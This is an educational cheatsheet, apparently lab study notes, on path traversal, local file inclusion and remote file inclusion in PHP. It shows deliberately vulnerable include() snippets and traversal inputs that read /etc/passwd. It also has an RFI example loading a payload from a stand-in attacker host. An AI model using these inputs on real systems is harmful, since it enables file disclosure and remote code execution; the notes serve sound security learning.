# LFI / RFI Cheatsheet

## Path Traversal vs LFI

Path Traversal usually means the application reads a file and returns its raw content.

LFI, or Local File Inclusion, means the application includes a local file through a language/runtime mechanism, such as PHP `include()` or `require()`.

## Path Traversal example

```php
echo file_get_contents('/var/www/images/' . $_GET['filename']);
```

The application reads a file and returns its contents.

## LFI example

```php
include($_GET["page"]);
```

The application includes a file as part of the program execution.

This matters because if PHP code is included, the server may execute it before returning output.

## Common PHP functions involved in LFI

- `include()`
- `require()`
- `include_once()`
- `require_once()`

## Scenario 1 - no fixed directory

```php
include($_GET["lang"]);
```

Expected usage:

```txt
?lang=EN.php
?lang=AR.php
```

Problem:

```txt
?lang=/etc/passwd
```

The user controls the full include target.

## Scenario 2 - fixed directory prefix

```php
include("languages/" . $_GET["lang"]);
```

Expected usage:

```txt
?lang=EN.php
```

Risky input:

```txt
?lang=../../../../etc/passwd
```

The final path can escape the `languages/` directory.

## Error messages in black-box testing

Invalid input such as:

```txt
?lang=THM
```

may reveal errors like:

```txt
include(languages/THM.php)
```

This can reveal:

- Prepended directory.
- Appended extension.
- Full server path.
- Function being used.

## RFI - Remote File Inclusion

RFI happens when a vulnerable include/require-style function loads a file from a remote URL controlled by an attacker.

Example:

```txt
?page=http://attacker.example/payload.txt
```

The target server fetches the remote file and may execute it as included code.

## PHP settings related to RFI

- `allow_url_fopen`
- `allow_url_include`

If remote includes are not needed, they should be disabled.

## PHP wrappers

PHP wrappers are stream mechanisms that can read or transform different data sources.

Examples:

- `php://filter`
- `php://input`
- `data://`
- `file://`
- `expect://`

## Key differences

| Type | Main idea | Typical impact |
|---|---|---|
| Path Traversal | Manipulate path to read files | File disclosure |
| LFI | Include local files already on target | File disclosure, sometimes RCE |
| RFI | Include remote attacker-controlled file | Often RCE |

## Key takeaway

LFI uses files already present on the target server. RFI lets the attacker control the included file remotely.
